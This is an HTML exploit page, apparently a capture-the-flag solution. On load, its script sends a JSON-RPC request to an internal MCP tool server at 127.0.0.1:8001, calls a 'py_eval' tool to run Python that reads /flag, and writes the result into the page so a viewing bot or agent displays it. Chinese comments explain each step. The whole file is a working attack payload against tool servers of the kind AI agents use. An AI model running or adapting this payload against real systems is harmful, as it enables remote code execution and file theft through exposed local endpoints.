<!doctype html>
<meta charset="utf-8">
<title>exploit</title>
<body>loading...</body>
<script>
(async () => {
  // 1) 直接打内网 MCP：127.0.0.1:8001/mcp
  const payload = {
    jsonrpc: "2.0",
    id: 1,
    params: {
      name: "py_eval",
      arguments: {
        // 关键：不要 print（stdout 不会回传），直接把 flag 放到局部变量 out
        code: 'out=open("/flag").read()'
      }
    }
  };

  const r = await fetch("http://127.0.0.1:8001/mcp", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  });

  const j = await r.json();

  // 2) MCP 返回里 result.content[0].text 是 json.dumps(result) 的字符串
  //    里面包含 {"result": "{'out': '...'}", "status":"success"} 这种结构:contentReference[oaicite:4]{index=4}
  const text = j.result.content[0].text;

  // 3) 把内容尽量放到 body 开头，确保 300 字截断里就能看到
  document.body.innerText = text;
})();
</script>
